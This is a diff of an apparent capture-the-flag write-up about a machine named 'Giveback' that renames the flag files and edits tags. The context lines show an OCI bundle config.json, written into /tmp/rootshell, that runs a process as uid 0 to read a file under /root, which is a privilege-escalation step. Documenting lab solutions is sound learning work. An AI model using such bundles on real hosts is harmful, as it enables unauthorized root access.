@@ -1,7 +1,7 @@
 ---
 title: Giveback
 slug: Giveback
-tags: [Linux, Kubernetes, PHP-Parameter-Injection, CVE-2024-5932, GiveWP, PHP-CGI, OCI-Bundle, Vulnerability Research]
+tags: [Kubernetes, PHP-Parameter-Injection, CVE-2024-5932, GiveWP, PHP-CGI, OCI-Bundle, Vulnerability Research]
 ---
 ## Executive Summary
 
@@ -909,7 +909,7 @@ Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your 
 
 Last login: Wed Nov 5 14:53:27 2025 from 10.10.15.211
 babywyrm@giveback:~$ ls
-user.txt
+local-proof.txt
 ```
 ## Privilege Escalation Path
 
@@ -1052,7 +1052,7 @@ babywyrm@giveback:/tmp/rootshell$ cat > config.json << 'EOF'
   "ociVersion": "1.0.2",
   "process": {
     "user": {"uid": 0, "gid": 0},
-    "args": ["/bin/cat", "/root/root.txt"],
+    "args": ["/bin/cat", "/root/privileged-proof.txt"],
     "cwd": "/",
     "env": ["PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"],
     "terminal": false
